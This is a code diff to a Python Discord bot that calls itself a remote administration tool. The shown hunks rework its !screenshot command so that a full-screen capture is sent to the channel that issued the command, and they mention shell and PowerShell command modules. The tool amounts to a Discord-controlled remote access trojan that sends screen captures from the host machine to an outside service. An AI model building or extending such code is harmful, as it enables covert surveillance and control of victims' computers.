@@ -19,10 +19,10 @@ client = Bot(description="A remote administration tool for discord", command_pre
 
 # Enter Discord Bot Token & Channel ID:
 BOT_TOKEN = 'Enter Token Here'
-CHANNEL_ID = 'Enter Channel ID here'
 
 #Used by !echo(set) and !cmd/!powershell(get)
 display_output = True
+
 
 @client.event
 async def on_ready():
@@ -144,8 +144,8 @@ async def logoff(seconds = 0):
 # Description: Takes a screenshot and sends it back
 # Usage: !screenshot or !screenshot secondsToScreenshot
 # Dependencies: time, os, mss
-@client.command()
-async def screenshot(seconds = 0):
+@client.command(pass_context = True)
+async def screenshot(ctx, seconds = 0):
 	if os.path.isfile('screenshot.png'):  # Check if a screenshot.png exists, if yes, delete it so it can be replaced
 		os.remove('screenshot.png')
 	await client.say("Taking a screenshot.")
@@ -153,7 +153,7 @@ async def screenshot(seconds = 0):
 		time.sleep(seconds)
 	with mss() as sct:
 		filename = sct.shot(mon=-1, output='screenshot.png')
-	await client.send_file(client.get_channel(CHANNEL_ID),'screenshot.png')
+	await client.send_file(ctx.message.channel, 'screenshot.png')
 
 
 # Module: say
